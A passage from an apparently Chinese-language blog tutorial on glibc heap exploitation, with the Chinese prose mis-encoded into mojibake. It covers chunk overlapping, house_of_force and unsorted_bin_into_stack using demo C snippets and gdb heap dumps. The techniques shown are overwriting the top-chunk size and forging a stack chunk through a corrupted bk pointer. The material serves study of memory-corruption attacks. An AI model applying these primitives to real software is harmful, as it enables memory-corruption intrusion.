class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603480</span>:<span class="number">0x4242424242424242</span><span class="number">0x4242424242424242</span></span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure><p> chunk 2 çš„ size å€¼ä¿®æ”¹ä¸º chunk 2 å’Œ chunk 3 çš„å¤§å°ä¹‹å’Œï¼Œæœ€åçš„ 1 æ˜¯æ ‡å¿—ä½ã€‚è¿™æ ·å½“æˆ‘ä»¬é‡Šæ”¾ chunk 2 çš„æ—¶å€™ï¼Œmalloc æ ¹æ®è¿™ä¸ªè¢«ä¿®æ”¹çš„ size å€¼ï¼Œä¼šä»¥ä¸º chunk 2 åŠ ä¸Š chunk 3 çš„åŒºåŸŸéƒ½æ˜¯è¦é‡Šæ”¾çš„ï¼Œç„¶åå°±é”™è¯¯åœ°ä¿®æ”¹äº† chunk 5 çš„ prev_sizeã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">59</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;</span>);</span><br><span class="line"><span class="number">60</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;</span>);</span><br><span class="line"><span class="number">61</span>   <span class="built_in">free</span>(p2);</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; p p5</span><br><span class="line"><span class="variable">$5</span> = (intptr_t *) 0x603fd0</span><br><span class="line">PwnLife&gt; x/20gx p5-2</span><br><span class="line">0x603fc0:0x0000000000000bd00x00000000000003f0   &lt;--- prev size / size</span><br><span class="line">0x603fd0:0x45454545454545450x4545454545454545</span><br><span class="line">0x603fe0:0x45454545454545450x4545454545454545</span><br><span class="line">0x603ff0:0x45454545454545450x4545454545454545</span><br><span class="line">0x604000:0x45454545454545450x4545454545454545</span><br><span class="line">0x604010:0x45454545454545450x4545454545454545</span><br><span class="line">0x604020:0x45454545454545450x4545454545454545</span><br><span class="line">0x604030:0x45454545454545450x4545454545454545</span><br><span class="line">0x604040:0x45454545454545450x4545454545454545</span><br><span class="line">0x604050:0x45454545454545450x4545454545454545</span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¼šå‘ç°ï¼Œå½“free æ‰ chunk 2 åï¼Œ chunk 2 ï¼Œchunk 3 ä¸€èµ·è¢«é‡Šæ”¾ï¼Œæ¥ç€ï¼Œå®ƒå‘ç°ç´§é‚»çš„ä¸€å— chunk 4 ä¹Ÿæ˜¯ free çŠ¶æ€ï¼Œå°±æŠŠå®ƒä¿©åˆå¹¶åœ¨äº†ä¸€èµ·ï¼Œç»„æˆä¸€ä¸ªå¤§ free chunkï¼Œæ”¾è¿› unsorted bin ä¸­ã€‚ chunk 5 çš„ prev size ä¹Ÿå‘ç”Ÿäº†å˜åŒ–ã€‚</p><p>ç„¶åå½“æˆ‘ä»¬ç”³è¯·ä¸€å—æ–°chunkçš„æ—¶å€™ï¼Œä¼šä» unsorted binä¸­å–å‡ºä¸€éƒ¨åˆ†ï¼Œæ¯”å¦‚è¿™é‡Œæˆ‘ä»¬ç”³è¯·ä¸€å— p6</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p6 = <span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br></pre></td></tr></table></figure><p>å³å°† chunk 2 chunk 3 çš„éƒ¨åˆ†æ‹¿å‡ºæ¥ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; p p6</span><br><span class="line"><span class="variable">$6</span> = (intptr_t *) 0x603400</span><br><span class="line">PwnLife&gt; x/20gx p6-2</span><br><span class="line">0x6033f0:0x41414141414141410x00000000000007e1</span><br><span class="line">0x603400:0x00007ffff7dd21380x00007ffff7dd2138</span><br><span class="line">0x603410:0x00000000006033f00x00000000006033f0</span><br><span class="line">0x603420:0x42424242424242420x4242424242424242</span><br><span class="line">0x603430:0x42424242424242420x4242424242424242</span><br><span class="line">0x603440:0x42424242424242420x4242424242424242</span><br><span class="line">0x603450:0x42424242424242420x4242424242424242</span><br><span class="line">0x603460:0x42424242424242420x4242424242424242</span><br><span class="line">0x603470:0x42424242424242420x4242424242424242</span><br><span class="line">0x603480:0x42424242424242420x4242424242424242</span><br></pre></td></tr></table></figure><p>ç„¶å unsorted binä¸­å‰©ä¸‹çš„éƒ¨åˆ†å°±æ˜¯ chunk4</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b58 (main_arena+88) â€”â–¸ 0x603bd0 â—‚â€” 0x7ffff7dd1b58</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">PwnLife&gt; x/20gx 0x603bd0</span><br><span class="line">0x603bd0:0x43434343434343430x00000000000003f1</span><br><span class="line">0x603be0:0x00007ffff7dd1b580x00007ffff7dd1b58</span><br><span class="line">0x603bf0:0x44444444444444440x4444444444444444</span><br><span class="line">0x603c00:0x44444444444444440x4444444444444444</span><br><span class="line">0x603c10:0x44444444444444440x4444444444444444</span><br><span class="line">0x603c20:0x44444444444444440x4444444444444444</span><br><span class="line">0x603c30:0x44444444444444440x4444444444444444</span><br><span class="line">0x603c40:0x44444444444444440x4444444444444444</span><br><span class="line">0x603c50:0x44444444444444440x4444444444444444</span><br><span class="line">0x603c60:0x44444444444444440x4444444444444444</span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™ï¼Œchunk 6 å’Œchunk 3å°±å·²ç»æ˜¯åŒä¸€å— chunkäº†ã€‚</p><h3 id="0x11-house-of-force"><a href="#0x11-house-of-force" class="headerlink" title="0x11 house_of_force"></a>0x11 house_of_force</h3><p>Exploiting the Top Chunk (Wilderness) header in order to get malloc to return a nearly-arbitrary pointer</p><p>house_of_force æ˜¯ä¸€ç§é€šè¿‡æ”¹å†™ top chunk çš„ size å­—æ®µæ¥æ¬ºéª— malloc è¿”å›ä»»æ„åœ°å€çš„æŠ€æœ¯ã€‚æˆ‘ä»¬çŸ¥é“åœ¨ç©ºé—²å†…å­˜çš„æœ€é«˜å¤„ï¼Œå¿…ç„¶å­˜åœ¨ä¸€å—ç©ºé—²çš„ chunkï¼Œå³ top chunkï¼Œå½“ bins å’Œ fast bins éƒ½ä¸èƒ½æ»¡è¶³åˆ†é…éœ€è¦çš„æ—¶å€™ï¼Œmalloc ä¼šä» top chunk ä¸­åˆ†å‡ºä¸€å—å†…å­˜ç»™ç”¨æˆ·ã€‚æ‰€ä»¥ top chunk çš„å¤§å°ä¼šéšç€åˆ†é…å’Œå›æ”¶ä¸åœåœ°å˜åŒ–ã€‚</p><p>é¦–å…ˆéšä¾¿ malloc ä¸€ä¸ª chunk</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/20gx 0x603000</span><br><span class="line">0x603000:0x00000000000000000x0000000000000111</span><br><span class="line">0x603010:0x00000000000000000x0000000000000000</span><br><span class="line">0x603020:0x00000000000000000x0000000000000000</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000000x0000000000000000</span><br><span class="line">PwnLife&gt;</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603100:0x00000000000000000x0000000000000000</span><br><span class="line">0x603110:0x00000000000000000x0000000000020ef1             &lt;--- top chunk</span><br><span class="line">0x603120:0x00000000000000000x0000000000000000</span><br><span class="line">0x603130:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å‡è®¾ ç¬¬ä¸€ä¸ªchunk æœ‰æº¢å‡ºæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥å»ä¿®æ”¹ã€‚top chunk çš„size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="keyword">intptr_t</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">-1</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/20gx 0x603100</span><br><span class="line">0x603100:0x00000000000000000x0000000000000000</span><br><span class="line">0x603110:0x00000000000000000xffffffffffffffff         &lt;--- top chunk </span><br><span class="line">0x603120:0x00000000000000000x0000000000000000</span><br><span class="line">0x603130:0x00000000000000000x0000000000000000</span><br><span class="line">0x603140:0x00000000000000000x0000000000000000</span><br><span class="line">0x603150:0x00000000000000000x0000000000000000</span><br><span class="line">0x603160:0x00000000000000000x0000000000000000</span><br><span class="line">0x603170:0x00000000000000000x0000000000000000</span><br><span class="line">0x603180:0x00000000000000000x0000000000000000</span><br><span class="line">0x603190:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å‘ç°ï¼Œè¿™ä¸ªæ—¶å€™sizeè¢«ä¿®æ”¹ä¸ºä¸€ä¸ª å¤§æ•°ã€‚</p><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥ malloc ä¸€ä¸ªä»»æ„å¤§å°çš„å†…å­˜è€Œä¸ç”¨è°ƒç”¨ mmap äº†ã€‚æ¥ä¸‹æ¥ malloc ä¸€ä¸ª chunkï¼Œä½¿å¾—è¯¥ chunk åˆšå¥½åˆ†é…åˆ°æˆ‘ä»¬æƒ³è¦æ§åˆ¶çš„é‚£å—åŒºåŸŸä¸ºæ­¢ï¼Œè¿™æ ·åœ¨ä¸‹ä¸€æ¬¡ malloc æ—¶ï¼Œå°±å¯ä»¥è¿”å›åˆ°æˆ‘ä»¬æƒ³è¦æ§åˆ¶çš„åŒºåŸŸäº†ã€‚è®¡ç®—æ–¹æ³•æ˜¯ç”¨ç›®æ ‡åœ°å€å‡å» top chunk åœ°å€ï¼Œå†å‡å» chunk å¤´çš„å¤§å°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">67</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> evil_size = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">4</span> - (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_top;</span><br><span class="line"><span class="number">68</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span></span><br><span class="line"><span class="number">69</span>    <span class="string">&quot;we will malloc %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);</span><br><span class="line"><span class="number">70</span> <span class="keyword">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æˆåŠŸæŠŠã€‚bss_var ç»™åˆ†é…äº†å‡ºæ¥</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">0x602050 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x10b9,</span><br><span class="line">  fd = 0x2073692073696854,</span><br><span class="line">  bk = 0x676e697274732061,</span><br><span class="line">  fd_nextsize = 0x6577207461687420,</span><br><span class="line">  bk_nextsize = 0x6f7420746e617720</span><br><span class="line">&#125;</span><br><span class="line">0x603108 &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x0,</span><br><span class="line">  fd = 0xffffffffffffef41,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">PwnLife&gt; x/20s 0x602050</span><br><span class="line">0x602050:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602051:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602052:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602053:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602054:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602055:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602056:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602057:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602058:<span class="string">&quot;\271\020&quot;</span></span><br><span class="line">0x60205b:<span class="string">&quot;&quot;</span></span><br><span class="line">0x60205c:<span class="string">&quot;&quot;</span></span><br><span class="line">0x60205d:<span class="string">&quot;&quot;</span></span><br><span class="line">0x60205e:<span class="string">&quot;&quot;</span></span><br><span class="line">0x60205f:<span class="string">&quot;&quot;</span></span><br><span class="line">0x602060 &lt;bss_var&gt;:<span class="string">&quot;This is a strin&quot;</span>...</span><br><span class="line">0x60206f &lt;bss_var+15&gt;:<span class="string">&quot;g that we want &quot;</span>...</span><br><span class="line">0x60207e &lt;bss_var+30&gt;:<span class="string">&quot;to overwrite.&quot;</span></span><br><span class="line">0x60208c:<span class="string">&quot;&quot;</span></span><br><span class="line">0x60208d:<span class="string">&quot;&quot;</span></span><br><span class="line">0x60208e:<span class="string">&quot;&quot;</span></span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure><p>è¯¥æŠ€æœ¯çš„ç¼ºç‚¹æ˜¯ä¼šå—åˆ° ASLR çš„å½±å“ï¼Œå› ä¸ºå¦‚æœæ”»å‡»è€…éœ€è¦ä¿®æ”¹æŒ‡å®šä½ç½®çš„å†…å­˜ï¼Œä»–é¦–å…ˆéœ€è¦çŸ¥é“å½“å‰ top chunk çš„ä½ç½®ä»¥æ„é€ åˆé€‚çš„ malloc å¤§å°æ¥è½¬ç§» top chunkã€‚è€Œ ASLR å°†ä½¿å †å†…å­˜åœ°å€éšæœºï¼Œæ‰€ä»¥è¯¥æŠ€æœ¯è¿˜éœ€åŒæ—¶é…åˆä½¿ç”¨ä¿¡æ¯æ³„æ¼ä»¥è¾¾æˆæ”»å‡»ã€‚</p><h3 id="0x12-unsorted-bin-into-stack"><a href="#0x12-unsorted-bin-into-stack" class="headerlink" title="0x12 unsorted_bin_into_stack"></a>0x12 unsorted_bin_into_stack</h3><p>unsorted-bin-into-stack é€šè¿‡æ”¹å†™ unsorted bin é‡Œ chunk çš„ bk æŒ‡é’ˆåˆ°ä»»æ„åœ°å€ï¼Œä»è€Œåœ¨æ ˆä¸Š malloc å‡º chunkã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¾—å…ˆmalloc ä¸€å— chunkï¼Œç„¶å free æ‰ï¼Œå°†ä»–æ”¾åˆ° unsorted biné‡Œã€‚å†è¿™ä¹‹å‰ï¼Œæˆ‘ä»¬ä¹Ÿå¾— malloc ä¸€å— ä½œä¸ºç¼“å†²çš„chunk ï¼Œé¿å…ç›®æ ‡chunk free æ‰åè¢«æ”¾å…¥åˆ° topchunké‡Œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">9</span>   <span class="keyword">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">11</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);</span><br><span class="line"><span class="number">12</span>   <span class="keyword">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="number">13</span></span><br><span class="line"><span class="number">14</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line"><span class="number">15</span>   <span class="built_in">free</span>(victim);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™ victim å°±è¢«æ”¾å…¥åˆ°äº† unsortedbiné‡Œ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b58 (main_arena+88) â€”â–¸ 0x602000 â—‚â€” 0x7ffff7dd1b58</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>ç´§æ¥ç€ï¼Œæˆ‘ä»¬åœ¨æ ˆä¸Š fake ä¸€ä¸ªchunkã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">19</span>   stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line"><span class="number">20</span>   stack_buffer[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>)stack_buffer;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; p stack_buffer</span><br><span class="line"><span class="variable">$3</span> = &#123;0x0, 0x110, 0x0, 0x7fffffffe3f0&#125;</span><br><span class="line">PwnLife&gt; p &amp;stack_buffer</span><br><span class="line"><span class="variable">$4</span> = (intptr_t (*)[4]) 0x7fffffffe3f0</span><br></pre></td></tr></table></figure><p>è®©ä¼ªé€ çš„ chunk çš„bk æŒ‡å‘è‡ªèº«ã€‚</p><p>ç„¶åæˆ‘ä»¬å‡è®¾ï¼Œæ­¤æ—¶æœ‰ä¸€ä¸ª å †æº¢å‡ºæ¼æ´ï¼Œå¯ä»¥ä¿®æ”¹ victim chunkçš„å†…å®¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">24</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);</span><br><span class="line"><span class="number">25</span>   victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line"><span class="number">26</span>   victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"><span class="number">27</span>   <span class="comment">//------------------------------------</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡ æº¢å‡ºæ¼æ´ä¿®æ”¹ victim chunk çš„bkï¼Œä½†æ­¤å‰ï¼Œæˆ‘ä»¬å¾— pass ä¸€ä¸ªcheck</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Size should be different from the next request size to <span class="keyword">return</span> fake_chunk <span class="keyword">and</span> need to pass the check <span class="number">2</span>*SIZE_SZ (&gt; <span class="number">16</span> on x64) &amp;&amp; &lt; av-&gt;system_mem</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">25</span>   victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line"><span class="number">26</span>   victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br></pre></td></tr></table></figure><p>ä¹‹åï¼Œ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; p victim</span><br><span class="line"><span class="variable">$6</span> = (intptr_t *) 0x602010</span><br><span class="line">PwnLife&gt; x/20gx victim</span><br><span class="line">0x602010:0x00007ffff7dd1b580x00007fffffffe3f0</span><br><span class="line">0x602020:0x00000000000000000x0000000000000000</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000000000</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br><span class="line">0x602060:0x00000000000000000x0000000000000000</span><br><span class="line">0x602070:0x00000000000000000x0000000000000000</span><br><span class="line">0x602080:0x00000000000000000x0000000000000000</span><br><span class="line">0x602090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020a0:0x00000000000000000x0000000000000000</span><br><span class="line">PwnLife&gt; x/20gx victim-2</span><br><span class="line">0x602000:0x00000000000000000x0000000000000020</span><br><span class="line">0x602010:0x00007ffff7dd1b580x00007fffffffe3f0   &lt;--- fd,bk /bk --&gt; fake chunk</span><br><span class="line">0x602020:0x00000000000000000x0000000000000000</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000000000</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br><span class="line">0x602060:0x00000000000000000x0000000000000000</span><br><span class="line">0x602070:0x00000000000000000x0000000000000000</span><br><span class="line">0x602080:0x00000000000000000x0000000000000000</span><br><span class="line">0x602090:0x00000000000000000x0000000000000000</span><br><span class="line">PwnLife&gt; x/20gx 0x00007fffffffe3f0                 &lt;--- fake chunk</span><br><span class="line">0x7fffffffe3f0:0x00000000000000000x0000000000000110</span><br><span class="line">0x7fffffffe400:0x00000000000000000x00007fffffffe3f0</span><br><span class="line">0x7fffffffe410:0x00007fffffffe5000x3fe51d8840ce6c00</span><br><span class="line">0x7fffffffe420:0x00000000004008600x00007ffff7a303f1</span><br><span class="line">0x7fffffffe430:0x00000000000400000x00007fffffffe508</span><br><span class="line">0x7fffffffe440:0x00000001f7b9a4880x0000000000400686</span><br><span class="line">0x7fffffffe450:0x00000000000000000xda692c6b09ba7393</span><br><span class="line">0x7fffffffe460:0x00000000004005900x00007fffffffe500</span><br><span class="line">0x7fffffffe470:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffe480:0x2596d314d11a73930x2596c3ad1e287393</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ­¤æ—¶å°±ç›¸å½“äº fake chunk å·²ç»è¢«é“¾æ¥åˆ° unsorted bin ä¸­ã€‚åœ¨ä¸‹ä¸€æ¬¡ malloc çš„æ—¶å€™ï¼Œmalloc ä¼šé¡ºç€ bk æŒ‡é’ˆè¿›è¡Œéå†ï¼Œäºæ˜¯å°±æ‰¾åˆ°äº†å¤§å°æ­£å¥½åˆé€‚çš„ fake chunkï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b68 (main_arena+104) â€”â–¸ 0x602000 â—‚â€” 0x7ffff7dd1b68</span><br><span class="line">smallbins</span><br><span class="line">0x20: 0x7ffff7dd1b68 (main_arena+104) â€”â–¸ 0x602000 â—‚â€” 0x7ffff7dd1b68</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>fake chunk è¢«å–å‡ºï¼Œè€Œ victim chunk è¢«ä» unsorted bin ä¸­å–å‡ºæ¥æ”¾åˆ°äº† small bin 